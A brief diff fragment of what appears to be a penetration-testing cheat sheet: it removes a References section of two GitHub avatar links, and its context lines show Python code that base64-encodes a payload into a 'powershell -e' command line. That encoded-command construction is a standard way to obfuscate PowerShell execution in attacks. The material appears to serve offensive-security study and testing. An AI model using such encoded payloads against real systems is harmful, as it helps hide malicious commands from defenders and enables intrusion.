@@ -2330,7 +2330,3 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 print(cmdline)
 ```
 
-# References
-[![](https://github.com/saisathvik1.png?size=50)](https://github.com/saisathvik1)
-[![](https://github.com/swisskyrepo.png?size=50)](https://github.com/swisskyrepo)
----
